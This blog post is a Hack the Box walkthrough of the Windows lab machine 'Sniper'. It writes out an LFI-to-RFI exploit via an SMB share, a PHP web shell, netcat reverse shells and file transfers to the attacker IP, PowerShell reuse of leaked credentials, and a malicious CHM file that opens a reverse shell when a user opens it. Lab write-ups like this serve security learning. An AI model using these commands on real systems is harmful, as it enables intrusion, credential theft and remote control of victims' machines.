+++
author = "Nick"
categories = ["hack the box", "LFI", "RFI", "PHP", "reverse shell", "Powershell", "rsync", "netcat", "windows", "chm"]
date = 2020-03-28T15:08:24Z
description = ""
draft = false
thumbnail = "/images/2019/12/sniper.png"
slug = "hack-the-box-sniper"
summary = "Welcome everyone. Today we will be doing the machine Sniper on Hack the Box. The machine is a Windows machine and listed as medium in difficulty. Let's jump in!"
tags = ["hack the box", "LFI", "RFI", "PHP", "reverse shell", "Powershell", "rsync", "netcat", "windows", "chm"]
title = "Hack the Box - Sniper"

+++


Welcome everyone. Today we will be doing the machine Sniper on Hack the Box. The machine is a Windows machine and listed as medium in difficulty. Let's jump in!

As usual, we kick it off with our ```nmap``` scan: ```nmap -sC -sV -oA initial_scan 10.10.10.151```
The results came back pretty limited, so we rerun the nmap with ```-p-``` for all ports and speed it up a bit with ```-T4```.

```
Nmap scan report for 10.10.10.151
Host is up (0.053s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-27T23:15:28
|_  start_date: N/A
```

We see a webserver running so we go to see what it's hosting. The site is a logistics site. We take a look at the source but there's nothing of any use there. We do see the ```body``` tag being repeated a few times, which is a bit odd. We do see we have some additional routes though. We have ```/blog``` and ```/user```. We explore those pages and the links that they contain. We see there is also a ```registration.php```. So to get a better idea of what might be here we'll use ```gobuster``` to start enumerating possible new locations and pages.

We'll give it our standard command: ```gobuster dir -u http://10.10.10.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php```.

While that run's we will quckly point ```SQLMap``` and the ```/blog/?lang=blog-es.php``` route and see what it might find. Nothing shows up. We'll load up ```Burpsuite``` and see what the requests are actually doing. 

We get our proxy turned on and start looking at the requests. The first request that we want to look at is obviously ```/blog/?lang=``` since this has potential for exploit. We play with the request a few times and finally find a ```LFI```.

![](/images/2019/12/image-5.png" caption="We request the system.ini file)

![](/images/2019/12/image-6.png" caption="And here it is.)

So it looks like we have an LFI we can exploit. Now we need convert this LFI into somehow. Thankfully Windows will let us execute scripts on ```SMB``` shares. Explicitly this [RFI PHP Bypass](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html). So we'll need to create a reverse shell script and remote execution script, spin up an SMB share and then call the script via our LFI. 

We'll start with making a ```Meterpreter``` reverse shell with ```MSFPC```. 
Command: ```MSFPC windows tun0 4444```

Now that we have our shell, we will get a SMB server running. Originally I spun up the share with ```impacket``` but that failed to work, so we will need to turn on our hosting locally, following the instructions linked above:

```
mkdir /var/www/html/pub/ 
chmod 0555 /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
echo > /etc/samba/smb.conf
echo -e "[global]\nworkgroup = WORKGROUP\nserver string = Samba Server %v\nnetbios name = name-me\nsecurity = user\nmap to guest = bad user\nname resolve order = bcast host\ndns proxy = no\nbind interfaces only = yes\n[ica]\npath = /var/www/html/pub\nwritable = no\nguest ok = yes\nguest only = yes\nread only = yes\ndirectory mode = 0555\nforce user = nobody" > /etc/samba/smb.conf
service smbd restart 
```
We can take those commands above and slap them in a ```.sh``` file for easy repeatability should we want to.
  
Now we need to have a way for our shell to executed. There are a few ways to do this, the most common being use a premade reverse shell execution script or make one using ```<?php echo shell_exec($_GET[‘cmd’]); ?>```. This will let you append CMD at the end of the .php call and execute something. In this case I used [WhileWinterWolfs PHP shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php).

Now that we have our pieces in place, let's execute! We head over to our browser and go to ```http://10.10.10.151/blog/?lang=//10.10.15.177/ica/wolfshell.php```. This will make the server load the file from our ```SMB``` share and give us a shell back to itself.

![](/images/2019/12/image-7.png)

We have a shell as ```iusr```. We need to convert this into a more permanent shell. We will upload our previously created payload to the system and execute it. 

During the upload we seem to keep getting some errors. Possibly due to Windows Defender eating our payload(s). So we'll get a bit more lowtech and basic. We can upload a ```netcat``` binary and just use that to forward a shell to us.

![](/images/2019/12/full_nc.gif)

Now that we have a more stable shell type, lets enumerate. In the ```inetpub``` structure we see some interesting files:

![](/images/2019/12/image-8.png)

Inside the ```db.php``` file we some credentials.

Creds:
```dbuser``` | ```36mEAhz/B8xQ~2VM```

These credentials very well could work for the user we are after, Chris. So we will try and escalate our permissions to his account via ```Powershell```. You need a bit of understanding on ```Powershell``` usage but it's pretty simple when we think about it. We need to store these credentials as variables, then pass them to the process we want to run.

```
$username = 'sniper\chris'
$pass = '36mEAhz/B8xQ~2VM'
$securePass = ConvertTo-SecureString $pass -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username,
$securePass
$session = New-PSSession -ComputerName Sniper -Credential $credential
Invoke-Command -Session $session -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.15.177 9999}
```

Here's a quick breakdown of the above. The ```$username``` variable stores our username. The ```$pass``` stores our password. We then convert the ```$pass``` variable into a secured variable that we can pass to other functions. With ```$credential``` we store the ```$username``` and secured ```$pass```. We then create a new session with ```New-PSSession```. This created a new "sub session" within the machine. Then we finally tell that session to forward a escalated shell via ```nc.exe```.

![](/images/2019/12/escalate.gif)

Now that we have a shell as Chris, let's enumerate again! There is a file called ```Instructions.chm``` in the ```Downloads``` folder. We also see there is a folder called ```Docs``` on the root of C. Inside we have a few files.

![](/images/2019/12/image-9.png)

We will send the .chm over to our machine with nc: 
```C:\temp\nc64.exe -w 3 10.10.15.177 777 < instructions.chm```

Catch it with the corresponding listener: 
```nc -lvnp 777 > instructions.chm```

This is what we see when we open the file:

![](/images/2019/12/image-10.png)

Nothing of great use. However based on what we saw, we know that the CEO is expecting some documentation to land in the Docs directory. Maybe we can craft a payload and when the CEO opens it, compromises him. Luckily for us, we have the means [to do just that](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1).

We'll clone this repo down to our Windows machine. We run the command in Powershell to create our payload:

```Out-CHM -Payload "C:\tmp\nc.exe 10.10.15.177 7331 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"```

This creates the payload. We then need to get our payload to ```C:\Docs```. Spin up a ```SimpleHTTPServer``` to host our file. Then use ```invoke-webrequest``` in powershell to get the file to download.

```invoke-webrequest -uri http://10.10.15.177/safe.chm -outfile C:\Users\Chris\Documents\safe.chm```

Once we download it, we move it to ```C:\Docs``` and wait for a shell.

![](/images/2019/12/lsat_step.gif)

We have a shell as root!

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

